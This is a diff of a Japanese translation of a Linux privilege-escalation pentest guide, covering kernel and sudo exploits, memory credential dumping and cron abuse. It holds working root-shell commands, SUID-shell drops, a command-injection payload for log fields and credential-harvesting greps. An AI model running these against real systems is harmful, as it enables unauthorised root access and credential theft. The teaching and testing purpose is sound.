@@ -6,7 +6,7 @@
 
 ### OS 情報
 
-稼働しているOSの情報を取得しましょう。
+実行中のOSに関する情報収集を始めましょう
 ```bash
 (cat /proc/version || uname -a ) 2>/dev/null
 lsb_release -a 2>/dev/null # old, not by default on many systems
@@ -14,40 +14,40 @@ cat /etc/os-release 2>/dev/null # universal on modern systems
 ```
 ### Path
 
-もし **`PATH`変数内の任意のフォルダに書き込み権限がある** 場合、いくつかの libraries や binaries をハイジャックできる可能性があります:
+もし**`PATH`変数内の任意のフォルダに書き込み権限がある**場合、いくつかのlibrariesやbinariesをハイジャックできる可能性があります:
 ```bash
 echo $PATH
 ```
 ### 環境情報
 
-環境変数に、興味深い情報、パスワード、またはAPIキーはありますか？
+環境変数に興味深い情報、パスワード、または API キーが含まれていますか？
 ```bash
 (env || set) 2>/dev/null
 ```
 ### Kernel exploits
 
-カーネルのバージョンを確認し、権限昇格に使える exploit があるかどうか確認する
+kernelのバージョンを確認し、escalate privilegesに使えるexploitがないか調べる
 ```bash
 cat /proc/version
 uname -a
 searchsploit "Linux Kernel"
 ```
-良い脆弱なカーネルのリストや、いくつかの既存の **compiled exploits** は以下で見つかります: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) and [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
-その他 **compiled exploits** を見つけられるサイト: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)
+ここでは良い vulnerable kernel list といくつかの既に **compiled exploits** を見つけることができます: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) and [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
+その他のサイトでいくつかの **compiled exploits** を見つけることができます: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)
 
-そのウェブからすべての脆弱なカーネルバージョンを抽出するには、次のようにします:
+そのウェブサイトからすべての vulnerable kernel versions を抽出するには次のようにします:
 ```bash
 curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
 ```
-kernel exploitsを検索するのに役立つツール:
+kernel exploits を検索するのに役立つツールは:
 
 [linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
 [linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
-[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (victim上で実行、kernel 2.x用のexploitのみチェック)
+[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (victim 上で実行、kernel 2.x の exploit のみをチェック)
 
-常に **Googleでkernelバージョンを検索** してください。あなたのkernelバージョンが既存のkernel exploitに記載されていることがあり、その場合そのexploitが有効であると確認できます。
+常に **Googleでカーネルバージョンを検索** してください。カーネルバージョンが何らかの kernel exploit に記載されている場合があり、その場合はその exploit が有効であることを確認できます。
 
-追加のkernel exploitation techniques:
+追加の kernel exploitation techniques:
 
 {{#ref}}
 ../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
@@ -66,44 +66,44 @@ g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
 https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
 https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
 ```
-### Sudo version
+### Sudo バージョン
 
-以下に示される脆弱な sudo バージョンに基づいて:
+次に示す脆弱な sudo バージョンに基づいて:
 ```bash
 searchsploit sudo
 ```
-この grep を使って、sudo のバージョンが脆弱かどうかを確認できます。
+この grep を使って sudo のバージョンが脆弱かどうか確認できます。
 ```bash
 sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
 ```
 ### Sudo < 1.9.17p1
 
-Sudo のバージョン 1.9.17p1 より前（**1.9.14 - 1.9.17 < 1.9.17p1**）では、ユーザーが制御するディレクトリから `/etc/nsswitch.conf` ファイルが使用される場合、sudo `--chroot` オプションを介して権限のないローカルユーザーが root に権限昇格できる問題があります。
+Sudo のバージョン 1.9.17p1 より前（**1.9.14 - 1.9.17 < 1.9.17p1**）では、ユーザーが制御するディレクトリから `/etc/nsswitch.conf` ファイルが読み込まれる場合に、sudo の `--chroot` オプションを利用して、権限のないローカルユーザが root に権限昇格できてしまいます。
 
-この脆弱性を悪用するための [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) と [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463) があります。実行する前に、`sudo` のバージョンが脆弱であり `chroot` 機能をサポートしていることを確認してください。
+Here is a [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) to exploit that [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463). Before running the exploit, make sure that your `sudo` version is vulnerable and that it supports the `chroot` feature.
 
-詳細は元の [脆弱性アドバイザリ](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/) を参照してください。
+For more information, refer to the original [vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)
 
 #### sudo < v1.8.28
 
-出典: @sickrov
+From @sickrov
 ```
 sudo -u#-1 /bin/bash
 ```
-### Dmesg 署名検証に失敗しました
+### Dmesg の署名検証に失敗しました
 
-この vuln がどのように悪用され得るかの**例**は**smasher2 box of HTB**を確認してください
+この脆弱性がどのように悪用され得るかの**例**については **smasher2 box of HTB** を確認してください。
 ```bash
 dmesg 2>/dev/null | grep "signature"
 ```
-### さらなるシステム列挙
+### 追加のシステム列挙
 ```bash
 date 2>/dev/null #Date
 (df -h || lsblk) #System stats
 lscpu #CPU info
 lpstat -a 2>/dev/null #Printers info
 ```
-## 可能な防御策の列挙
+## 可能な防御を列挙する
 
 ### AppArmor
 ```bash
@@ -140,7 +140,7 @@ cat /proc/sys/kernel/randomize_va_space 2>/dev/null
 ```
 ## Docker Breakout
 
-もし docker コンテナ内にいる場合、そこから脱出を試みることができます。
+もし docker container 内にいる場合、そこから脱出を試みることができます:
 
 {{#ref}}
 docker-security/
@@ -148,69 +148,69 @@ docker-security/
 
 ## ドライブ
 
-**何がマウントされていて何がアンマウントされているか**、どこで、なぜかを確認してください。何かがアンマウントされている場合は、それをマウントして機密情報がないか確認してみてください。
+**何がマウントされていて何がされていないか**、どこに、なぜマウントされているかを確認してください。もし何かがアンマウントされていれば、それをマウントして機密情報がないか確認してみてください。
 ```bash
 ls /dev 2>/dev/null | grep -i "sd"
 cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
 #Check if credentials in fstab
 grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
 ```
-## 有用なソフトウェア
+## 便利なソフトウェア
 
 有用なバイナリを列挙する
 ```bash
 which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
 ```
-また、**任意のコンパイラがインストールされているか**確認してください。kernel exploit を使用する必要がある場合、実際に使うマシン（またはそれに近いマシン）でコンパイルすることが推奨されるため、これは有用です。
+また、**コンパイラがインストールされているか**確認してください。これは、kernel exploit を使う必要がある場合に便利です。実行するマシン（または類似のマシン）でコンパイルすることが推奨されているためです。
 ```bash
 (dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
 ```
-### 脆弱なソフトウェアがインストールされている
+### インストールされた脆弱なソフトウェア
 
-**インストールされているパッケージやサービスのバージョン**を確認してください。例えば古い Nagios バージョンが存在し、that could be exploited for escalating privileges…\
-より疑わしいインストール済みソフトウェアのバージョンは手動で確認することを推奨します。
+**インストールされているパッケージやサービスのバージョン**を確認してください。例えば、古い Nagios バージョンが存在し、それが escalating privileges に悪用される可能性があります…\
+疑わしいインストール済みソフトウェアのバージョンは手動で確認することを推奨します。
 ```bash
 dpkg -l #Debian
 rpm -qa #Centos
 ```
-もしマシンにSSHでアクセスできるなら、インストールされている古い脆弱なソフトウェアを確認するために**openVAS**を使うこともできます。
+SSHでマシンにアクセスできる場合、マシン内にインストールされている古く脆弱なソフトウェアを確認するために **openVAS** を使用することもできます。
 
-> [!NOTE] > _これらのコマンドは大量の情報を表示し、その多くはほとんど役に立たないことに注意してください。したがって、インストールされているソフトウェアのバージョンが既知のエクスプロイトに対して脆弱かどうかをチェックする OpenVAS 等のアプリケーションを使うことを推奨します_
+> [!NOTE] > _これらのコマンドは大量の情報を表示し、その大部分は役に立たない可能性があるため、OpenVASのようなインストール済みソフトウェアのバージョンが既知の exploits に対して脆弱かどうかをチェックするアプリケーションを使用することを推奨します_
 
-## Processes
+## プロセス
 
-どの**プロセス**が実行されているかを確認し、どのプロセスが**本来より多くの権限**を持っていないかをチェックしてください（例えば tomcat が root によって実行されているかどうかなど）。
+実行されている **どのプロセス** を確認し、どのプロセスが **本来より多くの権限を持っているか** をチェックしてください（例えば tomcat が root によって実行されているなど）
 ```bash
 ps aux
 ps -ef
 top -n 1
 ```
-Always check for possible [**electron/cef/chromium debuggers** running — 権限昇格に悪用できる可能性があります](electron-cef-chromium-debugger-abuse.md). **Linpeas** detect those by checking the `--inspect` parameter inside the command line of the process.\
-また、**プロセスのバイナリに対する権限を確認**してください。上書きできるかもしれません。
+常に[**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md)が動作していないか確認してください。**Linpeas**はプロセスのコマンドライン内の`--inspect`パラメータをチェックしてそれらを検出します。\
+また、プロセスのバイナリに対するprivilegesを確認してください。上書きできるものがあるかもしれません。
 
-### プロセス監視
+### Process monitoring
 
-プロセスを監視するために [**pspy**](https://github.com/DominicBreuker/pspy) のようなツールを使用できます。これは、脆弱なプロセスが頻繁に実行されている場合や、特定の条件が満たされたときにそれらを特定するのに非常に役立ちます。
+プロセスの監視には[**pspy**](https://github.com/DominicBreuker/pspy)のようなツールを使用できます。これは、脆弱なプロセスが頻繁に実行される場合や一定の条件が満たされたときに特定するのに非常に有用です。
 
-### プロセスメモリ
+### Process memory
 
-サーバの一部サービスは、**credentials in clear text inside the memory** を保存することがあります。\
-通常、他ユーザに属するプロセスのメモリを読むには **root privileges** が必要なため、これは通常既に root でありさらに資格情報を発見したい場合により有用です。\
-ただし、**通常ユーザーとしては自分が所有するプロセスのメモリを読むことができる**点は覚えておいてください。
+サーバの一部サービスは**credentials in clear text inside the memory**を保存することがあります。\
+通常、他のユーザに属するプロセスのメモリを読むには**root privileges**が必要になるため、これは通常、既にrootでさらに多くのcredentialsを見つけたいときに役立ちます。\
+ただし、通常ユーザとして自分が所有するプロセスのメモリは読むことができることを忘れないでください。
 
 > [!WARNING]
-> 最近のマシンの多くでは **ptrace をデフォルトで許可していません**。つまり、権限のないユーザに属する他のプロセスをダンプできないことが多い点に注意してください。
+> Note that nowadays most machines **don't allow ptrace by default** which means that you cannot dump other processes that belong to your unprivileged user.
 >
 > The file _**/proc/sys/kernel/yama/ptrace_scope**_ controls the accessibility of ptrace:
 >
-> - **kernel.yama.ptrace_scope = 0**: 同じ uid であればすべてのプロセスをデバッグできます。これは ptrace の古典的な動作です。
-> - **kernel.yama.ptrace_scope = 1**: 親プロセスのみデバッグ可能です。
+> - **kernel.yama.ptrace_scope = 0**: 同じ uid を持つ限り、すべてのプロセスをデバッグできます。これは ptrace が従来どおり動作していた方法です。
+> - **kernel.yama.ptrace_scope = 1**: 親プロセスのみがデバッグ可能です。
 > - **kernel.yama.ptrace_scope = 2**: 管理者のみが ptrace を使用できます（CAP_SYS_PTRACE が必要）。
-> - **kernel.yama.ptrace_scope = 3**: ptrace でトレースできるプロセスはありません。一度設定すると、ptrace を再度有効にするには再起動が必要です。
+> - **kernel.yama.ptrace_scope = 3**: ptrace によるトレースは一切不可です。一度設定すると、ptrace を再度有効にするには再起動が必要です。
 
 #### GDB
 
-FTP サービス（例）のメモリにアクセスできる場合、Heap を取得してその中の credentials を検索できます。
+たとえば FTP サービスのメモリにアクセスできる場合、Heap を取得してその中の credentials を検索できます。
 ```bash
 gdb -p <FTP_PROCESS_PID>
 (gdb) info proc mappings
@@ -219,7 +219,7 @@ gdb -p <FTP_PROCESS_PID>
 (gdb) q
 strings /tmp/mem_ftp #User and password
 ```
-#### GDB Script
+#### GDB スクリプト
 ```bash:dump-memory.sh
 #!/bin/bash
 #./dump-memory.sh <PID>
@@ -232,7 +232,9 @@ done
 ```
 #### /proc/$pid/maps & /proc/$pid/mem
 
-指定したプロセスIDに対し、**maps はそのプロセスの仮想アドレス空間内でメモリがどのようにマッピングされているかを示します**; また、各マッピング領域の**アクセス権**も表示します。 その **mem** 擬似ファイルは**プロセスのメモリ本体を露出します**。**maps** ファイルから、どのメモリ領域が**読み取り可能か**とそのオフセットが分かります。この情報を使って**mem ファイルをシークし、読み取り可能な領域をすべてダンプします**。
+特定のプロセスIDについて、**maps がそのプロセスの仮想アドレス空間内でメモリがどのようにマップされているかを示し**、また**各マップ領域の権限**も示します。  
+この**mem** 擬似ファイルは**プロセスのメモリ自体を公開します**。**maps** ファイルから、どの**メモリ領域が読み取り可能か**とそのオフセットが分かります。  
+この情報を使って、**mem ファイル内をシークして読み取り可能な領域をすべてダンプする**ことでファイルに書き出します。
 ```bash
 procdump()
 (
@@ -247,14 +249,14 @@ rm $1*.bin
 ```
 #### /dev/mem
 
-`/dev/mem` はシステムの**物理**メモリにアクセスするためのインターフェースで、仮想メモリにはアクセスしません。カーネルの仮想アドレス空間には /dev/kmem を使ってアクセスできます。\
+`/dev/mem` はシステムの **物理** メモリにアクセスするためのものであり、仮想メモリにはアクセスしません。カーネルの仮想アドレス空間には /dev/kmem を使ってアクセスできます。\
 通常、`/dev/mem` は **root** と **kmem** グループのみが読み取り可能です。
 ```
 strings /dev/mem -n10 | grep -i PASS
 ```
 ### ProcDump for linux
 
-ProcDumpは、Windows向けのSysinternalsスイートにあるクラシックなProcDumpツールをLinux向けに再構想したものです。入手先は [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
+ProcDump は、Sysinternals スイートの Windows 向けの古典的な ProcDump ツールを Linux 向けに再実装したものです。入手は [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux) から。
 ```
 procdump -p 1714
 
@@ -283,38 +285,38 @@ Press Ctrl-C to end monitoring without terminating the process.
 ```
 ### ツール
 
-プロセスのメモリをダンプするには、次を使用できます:
+プロセスメモリをダンプするには、次を使用できます:
 
 - [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
-- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_手動でroot要件を削除し、あなたが所有するプロセスをダンプできます
+- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_手動で root 要件を削除し、自分が所有するプロセスをダンプできます
 - Script A.5 from [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root が必要です)
 
-### プロセスメモリからの資格情報
+### プロセスメモリからの認証情報
 
 #### 手動の例
 
-authenticator プロセスが実行されている場合:
+authenticator プロセスが実行されていることが分かった場合:
 ```bash
 ps -ef | grep "authenticator"
 root      2027  2025  0 11:46 ?        00:00:00 authenticator
 ```
-プロセスを dump the process して（前のセクションを参照して、プロセスのメモリを dump the memory of a process するさまざまな方法を確認してください）、メモリ内の credentials を検索できます：
+プロセスをダンプし（プロセスのメモリをダンプするさまざまな方法は前のセクションを参照）、メモリ内の資格情報を検索できます：
 ```bash
 ./dump-memory.sh 2027
 strings *.dump | grep -i password
 ```
 #### mimipenguin
 
-このツール [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) は **steal clear text credentials from memory** およびいくつかの **well known files** から情報を抜き取ります。正しく動作させるには root privileges が必要です。
+このツール [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) は、**メモリから平文の認証情報を盗み出し**、いくつかの**既知のファイル**からも取得します。正常に動作させるにはroot権限が必要です。
 
-| 機能                                           | プロセス名         |
-| ------------------------------------------------- | -------------------- |
-| GDM password (Kali Desktop, Debian Desktop)       | gdm-password         |
-| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
-| LightDM (Ubuntu Desktop)                          | lightdm              |
-| VSFTPd (Active FTP Connections)                   | vsftpd               |
-| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
-| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |
+| 機能                                               | プロセス名             |
+| ------------------------------------------------- | --------------------- |
+| GDM password (Kali Desktop, Debian Desktop)       | gdm-password          |
+| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon  |
+| LightDM (Ubuntu Desktop)                          | lightdm               |
+| VSFTPd (Active FTP Connections)                   | vsftpd                |
+| Apache2 (Active HTTP Basic Auth Sessions)         | apache2               |
+| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                 |
 
 #### 検索用正規表現/[truffleproc](https://github.com/controlplaneio/truffleproc)
 ```bash
@@ -330,39 +332,41 @@ Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
 # finding secrets
 # results in /tmp/tmp.o6HV0Pl3fe/results.txt
 ```
-## Scheduled/Cron ジョブ
+## スケジュール/Cron ジョブ
 
-### Crontab UI (alseambusher) running as root – web-based scheduler privesc
+### Crontab UI (alseambusher) が root で動作している場合 — webベースの scheduler privesc
 
-If a web “Crontab UI” panel (alseambusher/crontab-ui) runs as root and is only bound to loopback, you can still reach it via SSH local port-forwarding and create a privileged job to escalate.
+web “Crontab UI” パネル (alseambusher/crontab-ui) が root として動作し、loopback のみでバインドされている場合でも、SSH のローカルポートフォワーディング経由で到達し、権限昇格のための特権ジョブを作成できます。
 
-Typical chain
-- loopbackのみで公開されているポートを発見（例: 127.0.0.1:8000）および Basic-Auth リームを `ss -ntlp` / `curl -v localhost:8000` で確認
-- 運用アーティファクトから資格情報を見つける:
-- Backups/scripts with `zip -P <password>`
-- systemd ユニットが `Environment="BASIC_AUTH_USER=..."`、`Environment="BASIC_AUTH_PWD=..."` を公開している
-- トンネルを張ってログイン:
+典型的な手順
+- `ss -ntlp` / `curl -v localhost:8000` で loopback のみバインドされたポート（例: 127.0.0.1:8000）と Basic-Auth realm を発見する
+- 運用関連のアーティファクトから認証情報を探す:
+  - バックアップやスクリプト内（`zip -P <password>`）
+  - systemd ユニットが `Environment="BASIC_AUTH_USER=..."`、`Environment="BASIC_AUTH_PWD=..."` を露出している
+- トンネルしてログイン:
 ```bash
 ssh -L 9001:localhost:8000 user@target
 # browse http://localhost:9001 and authenticate
 ```
-- 高権限のジョブを作成して即実行する (drops SUID shell):
+- 高権限のジョブを作成して即時実行する (drops SUID shell):
 ```bash
 # Name: escalate
 # Command:
 cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
 ```
-- 使用する:
+- 使用してください:
 ```bash
 /tmp/rootshell -p   # root shell
 ```
-ハードニング
-- Crontab UI を root で実行しない; 専用ユーザーと最小権限で制限する
-- localhost にバインドし、さらに firewall/VPN でアクセスを制限する; パスワードを再利用しない
-- unit ファイルにシークレットを埋め込まない; secret stores または root のみが読める EnvironmentFile を使用する
-- on-demand ジョブ実行に対して audit/logging を有効にする
+# ハードニング
+- Crontab UIをrootで実行しない; 専用ユーザーと最小権限で制限する
+- localhostにバインドし、さらにfirewall/VPNでアクセスを制限する; パスワードを再利用しない
+- unit filesに秘密を埋め込まない; secret storesまたはroot-only EnvironmentFileを使用する
+- オンデマンドのジョブ実行に対してaudit/loggingを有効にする
 
-スケジュールされたジョブに脆弱性がないか確認する。root によって実行されるスクリプトを悪用できるかもしれない（wildcard vuln? root が使用するファイルを改変できるか? symlinks を使う? root が使用するディレクトリに特定のファイルを作成する?）。
+
+
+スケジュールされたjobに脆弱性がないか確認する。rootで実行されるスクリプトを悪用できるかもしれない（wildcard vuln? rootが使用するファイルを変更できるか? symlinksを使う? rootが使うディレクトリに特定のファイルを作成する?）。
 ```bash
 crontab -l
 ls -al /etc/cron* /etc/at*
@@ -370,26 +374,26 @@ cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/nul
 ```
 ### Cron path
 
-例えば、_/etc/crontab_ の中に次の PATH を見つけることができます: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_
+例えば、_/etc/crontab_ の中に PATH が見つかります: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_
 
-(_「user」ユーザーが /home/user に書き込み権限を持っている点に注意してください_)
+(_ユーザー "user" が /home/user に書き込み権限を持っている点に注意_)
 
-この crontab 内で root が PATH を設定せずにコマンドやスクリプトを実行しようとすると、例えば: _\* \* \* \* root overwrite.sh_\  
-その場合、次のようにして root shell を取得できます:
+この crontab 内で root ユーザーがパスを設定せずにコマンドやスクリプトを実行しようとする場合、例えば: _\* \* \* \* root overwrite.sh_\
+すると、次の方法で root シェルを取得できます:
 ```bash
 echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
 #Wait cron job to be executed
 /tmp/bash -p #The effective uid and gid to be set to the real uid and gid
 ```
-### Cron が wildcard を含むスクリプトを使用している場合 (Wildcard Injection)
+### Cron がワイルドカードを含むスクリプトを使用している場合 (Wildcard Injection)
 
-スクリプトが root によって実行され、コマンド内に “**\***” が含まれている場合、これを悪用して予期しないこと（例えば privesc）を引き起こす可能性があります。例:
+スクリプトが root によって実行され、コマンド内に “**\***” が含まれている場合、これを悪用して予期しないこと（privesc など）を引き起こす可能性があります。例:
 ```bash
 rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
 ```
-**wildcardがパスの前にある場合** _**/some/path/\***_ **、脆弱ではありません（** _**./\***_ **も脆弱ではありません）。**
+**If the wildcard is preceded of a path like** _**/some/path/\***_ **, it's not vulnerable (even** _**./\***_ **is not).**
 
-詳細な wildcard exploitation トリックについては、以下のページを参照してください：
+以下のページを読んで、より多くの wildcard exploitation tricks を参照してください:
 
 
 {{#ref}}
@@ -399,9 +403,9 @@ wildcards-spare-tricks.md
 
 ### Bash arithmetic expansion injection in cron log parsers
 
-Bash performs parameter expansion and command substitution before arithmetic evaluation in ((...)), $((...)) and let. If a root cron/parser reads untrusted log fields and feeds them into an arithmetic context, an attacker can inject a command substitution $(...) that executes as root when the cron runs.
+Bash は ((...))、$((...))、および let 内での arithmetic evaluation の前に parameter expansion と command substitution を実行します。もし root cron/parser が信頼できないログフィールドを読み取り、それらを算術コンテキストに渡すと、攻撃者は cron 実行時に root として実行される command substitution $(...) を注入できます。
 
-- Why it works: Bash では展開は次の順序で行われます: parameter/variable expansion, command substitution, arithmetic expansion, then word splitting and pathname expansion. したがって `$(/bin/bash -c 'id > /tmp/pwn')0` のような値はまず置換され（コマンドが実行され）、残った数値の `0` が算術に使われるためスクリプトはエラーなく続行されます。
+- Why it works: In Bash, expansions occur in this order: parameter/variable expansion, command substitution, arithmetic expansion, then word splitting and pathname expansion. したがって `$(/bin/bash -c 'id > /tmp/pwn')0` のような値はまず置換され（コマンドが実行され）、残った数値 `0` が算術に使われてスクリプトはエラーなく続行されます。
 
 - Typical vulnerable pattern:
 ```bash
@@ -413,7 +417,7 @@ while IFS=',' read -r ts user count rest; do
 done < /var/www/app/log/application.log
 ```
 
-- Exploitation: パースされるログに attacker-controlled なテキストを書き込み、数値に見えるフィールドが command substitution を含み末尾が数字になるようにします。コマンドは stdout に出力しない（またはリダイレクトする）ようにして、算術が有効なままになるようにしてください。
+- Exploitation: パースされるログに attacker-controlled なテキストを書き込み、数値に見えるフィールドに command substitution を含ませ末尾が数字になるようにします。算術が有効であるようにコマンドは stdout に出力しない（またはリダイレクトする）ようにしてください。
 ```bash
 # Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
 $(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
@@ -422,51 +426,51 @@ $(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
 
 ### Cron script overwriting and symlink
 
-root によって実行される **can modify a cron script** を変更できるなら、非常に簡単に shell を取得できます:
+もし root によって実行される **can modify a cron script** を変更できるなら、簡単に shell を取得できます:
 ```bash
 echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
 #Wait until it is executed
 /tmp/bash -p
 ```
-もし root によって実行される script が **directory where you have full access** を使用しているなら、その folder を削除して、あなたが管理する script を提供する別の場所への **symlink folder を作成する** のが有効かもしれません。
+root によって実行されるスクリプトが **あなたがフルアクセスできるディレクトリ** を使用している場合、当該フォルダを削除して、あなたが制御するスクリプトを配置した別のフォルダへの **symlink フォルダを作成する** のが有効かもしれません。
 ```bash
 ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
 ```
-### Custom-signed cron binaries with writable payloads
-Blue team が cron 駆動のバイナリを「署名」して、カスタム ELF セクションをダンプしベンダー文字列を grep してから root として実行することがあります。もしそのバイナリが group-writable（例: `/opt/AV/periodic-checks/monitor` が `root:devs 770`）で、署名素材を leak できれば、セクションを偽造して cron タスクをハイジャックできます。
+### 書き込み可能なペイロードを持つカスタム署名された cron バイナリ
+Blueチームは、cronで実行されるバイナリを実行前にカスタムELFセクションをダンプしてベンダー文字列を grep し、root 権限で実行する前に「署名」することがある。そのバイナリが group-writable（例: `/opt/AV/periodic-checks/monitor` が `root:devs 770` 所有）で、signing material を leak できる場合、セクションを偽造して cron タスクをハイジャックできる:
 
-1. `pspy` を使って検証フローをキャプチャします。Era では、root が `objcopy --dump-section .text_sig=text_sig_section.bin monitor` を実行し、その後 `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin` を実行してからファイルを実行していました。
-2. leak したキー/設定（`signing.zip` 内）を使って期待される証明書を再生成します:
+1. `pspy` を使って検証フローをキャプチャする。例として Era では、root が `objcopy --dump-section .text_sig=text_sig_section.bin monitor` を実行し、その後 `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin` を実行してからファイルを実行していた。
+2. leaked key/config（`signing.zip` から）を使って期待される証明書を再作成する:
 ```bash
 openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
 ```
-3. 悪意ある置換バイナリ（例: SUID bash を落とす、SSH キーを追加する）を作成し、grep が通るように証明書を `.text_sig` に埋め込みます:
+3. 悪意ある置換をビルドする（例: SUID な bash を置く、SSH キーを追加する）そして証明書を `.text_sig` に埋め込んで grep が通るようにする:
 ```bash
 gcc -fPIC -pie monitor.c -o monitor
 objcopy --add-section .text_sig=cert.pem monitor
 objcopy --dump-section .text_sig=text_sig_section.bin monitor
 strings text_sig_section.bin | grep 'Era Inc.'
 ```
-4. 実行ビットを維持してスケジュールされたバイナリを上書きします:
+4. 実行ビットを維持したままスケジュールされたバイナリを上書きする:
 ```bash
 cp monitor /opt/AV/periodic-checks/monitor
 chmod 770 /opt/AV/periodic-checks/monitor
 ```
-5. 次の cron 実行を待ちます。単純な署名チェックが通ると、あなたのペイロードが root として実行されます。
+5. 次の cron 実行を待つ。単純な signature check が成功すると、あなたの payload が root として実行される。
 
-### Frequent cron jobs
+### 頻繁に実行される cron ジョブ
 
-プロセスを監視して、1分、2分、5分ごとに実行されているプロセスを探すことができます。これを利用して権限昇格できるかもしれません。
+プロセスを監視して、1分、2分、5分ごとに実行されているプロセスを探せる。そこを利用して escalate privileges できるかもしれない。
 
-例えば、**1分間 0.1s ごとに監視し**、**実行回数の少ないコマンド順にソートし**、最も多く実行されたコマンドを削除するには、次のようにします:
+例えば、**0.1秒ごとに1分間監視**し、**実行回数の少ない順にソート**して最も多く実行されたコマンドを除外するには、次のようにする:
 ```bash
 for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
 ```
-**また使用できます** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (これは起動するすべてのプロセスを監視して一覧表示します).
+**また使用できます** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (これは起動したすべてのプロセスを監視して一覧表示します).
 
 ### 見えない cron jobs
 
-コメントの後に**キャリッジリターンを置く**（改行文字なしで）ことでcronjobを作成でき、cron jobは動作します。例（キャリッジリターン文字に注意）:
+コメントの後に**キャリッジリターンを入れる**（改行文字なし）ことで cronjob を作成でき、cron job は動作します。例（キャリッジリターン文字に注意）:
 ```bash
